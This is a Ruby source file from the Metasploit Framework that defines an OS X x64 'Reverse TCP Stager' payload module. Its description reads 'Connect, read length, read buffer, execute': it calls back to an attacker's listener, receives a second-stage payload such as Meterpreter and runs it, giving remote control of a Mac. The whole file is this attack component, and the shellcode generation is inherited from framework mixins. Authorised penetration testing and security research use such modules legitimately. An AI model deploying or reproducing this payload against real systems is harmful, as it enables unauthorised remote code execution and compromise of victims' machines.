##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 168

  include Msf::Payload::Osx::ReverseTcp_x64
  include Msf::Payload::TransportConfig
  include Msf::Payload::Stager

  def initialize(info = { })
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager',
      'Description' => 'Connect, read length, read buffer, execute',
      'Author'      => 'nemo <nemo[at]felinemenace.org>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => { 'RequiresMidstager' => false }, # Originally set to true, but only Linux payloads use this at the moment, not OSX.
      'Convention'  => 'sockedi',
    ))
    register_options([
      OptInt.new('MeterpreterDebugLevel', [ true, "Set debug level for meterpreter 0-3 (Default output is strerr)", 0])
    ])
  end

  def generate(opts = {})
    generate_reverse_tcp(opts)
  end

end
